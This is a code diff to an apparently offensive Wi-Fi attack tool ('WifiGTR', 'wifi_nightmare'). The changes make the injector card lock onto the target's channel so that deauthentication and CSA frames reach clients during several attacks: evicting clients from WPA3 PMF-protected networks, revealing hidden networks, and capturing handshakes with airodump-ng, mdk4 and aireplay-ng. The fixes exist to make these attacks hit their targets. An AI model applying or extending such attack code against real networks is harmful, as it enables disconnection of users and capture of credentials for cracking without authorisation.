@@ -650,7 +650,16 @@ class WifiGTR:
         print(f"BSSID    : {utils.mask_bssid(bssid)}")
         print(f"Channel  : {C_YELLOW}{channel}{C_RESET}")
         print(f"{C_YELLOW}[i] Injecting CSA frames to evict clients from WPA3 (PMF-protected)...{C_RESET}")
-        
+
+        # Lock the injector card to the target's channel FIRST. Without this,
+        # the CSA burst below transmits on whatever channel the injector
+        # happened to be left on by a previous attack -- the frames never
+        # reach this target's clients at all, silently.
+        utils.run_command(["ip", "link", "set", self.interface, "up"])
+        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
+        if self.injector_interface != self.interface:
+            utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])
+
         try:
             from wifi_nightmare.eviction import AdvancedEviction
             eviction = AdvancedEviction(self.injector_interface, bssid, channel, ssid)
@@ -818,7 +827,15 @@ class WifiGTR:
         for i, (bssid, channel) in enumerate(hidden_targets):
             print(f"\n{C_WHITE}--- Target {i+1}/{len(hidden_targets)}: {utils.mask_bssid(bssid)} ---{C_RESET}")
             utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
-            
+            # NetworkAttacker below injects deauth on self.injector_interface,
+            # NOT self.interface. In dual-card mode those are different
+            # physical cards -- without this, the injector stays parked on
+            # whatever channel the PREVIOUS target left it on while iterating
+            # through multiple hidden networks, so deauth silently misses
+            # every target after the first.
+            if self.injector_interface != self.interface:
+                utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])
+
             attacker = NetworkAttacker(
                 interface=self.injector_interface,
                 target_bssid=bssid,
@@ -861,6 +878,13 @@ class WifiGTR:
         
         utils.run_command(["ip", "link", "set", self.interface, "up"])
         utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
+        # "reveal"/"passive" build NetworkAttacker(interface=self.injector_interface)
+        # below and inject deauth there directly -- unlike mode=="handshake",
+        # which locks the injector's channel itself inside capture_handshake().
+        # Without this, the injector card stays parked on whatever channel it
+        # was last left on and every deauth frame misses this target.
+        if self.injector_interface != self.interface:
+            utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])
 
         # --- Native handshake capture (airodump-ng + mdk4/aireplay-ng) ---
         if mode == "handshake":
